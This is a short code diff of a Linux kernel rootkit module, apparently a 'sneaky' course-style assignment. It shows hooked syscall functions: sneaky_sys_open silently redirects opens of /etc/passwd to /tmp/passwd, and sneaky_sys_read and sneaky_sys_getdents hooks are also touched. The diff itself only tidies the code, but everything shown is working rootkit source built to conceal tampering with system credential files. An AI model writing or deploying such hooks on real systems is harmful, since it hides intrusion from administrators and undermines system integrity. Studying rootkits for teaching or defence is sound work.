@@ -53,8 +53,7 @@ asmlinkage int sneaky_sys_open(const char * pathname, int flags) {
   //printk(KERN_INFO "Very, very Sneaky!\n");
   const char *findPath = strstr(pathname,"/etc/passwd");
   if(findPath!=NULL){
-    //
-    copy_to_user((void*)findPath, "/tmp/passwd", 11);
+    copy_to_user((void *)findPath, "/tmp/passwd", strlen("/tmp/passwd"));
   }
   return original_call(pathname, flags);
 }
@@ -85,9 +84,9 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
 asmlinkage ssize_t (*original_read)(int fd, void * buf, size_t count);
 
 asmlinkage ssize_t sneaky_sys_read(int fd, void * buf, size_t count) {
-  
-  ssize_t nread = original_read(fd, buf, count);
   char *start, *end;
+  ssize_t nread = original_read(fd, buf, count);
+  start = NULL, end = NULL;
   // if (nread == -1) {
   // }
   if (nread == 0) {
